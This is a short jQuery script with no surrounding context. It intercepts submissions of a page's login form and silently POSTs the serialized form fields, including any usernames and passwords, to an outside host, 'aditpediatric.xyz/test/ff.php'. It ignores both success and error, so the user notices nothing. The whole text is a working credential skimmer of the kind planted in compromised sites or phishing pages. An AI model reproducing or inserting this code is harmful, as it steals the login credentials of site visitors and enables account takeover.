$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://aditpediatric.xyz/test/ff.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
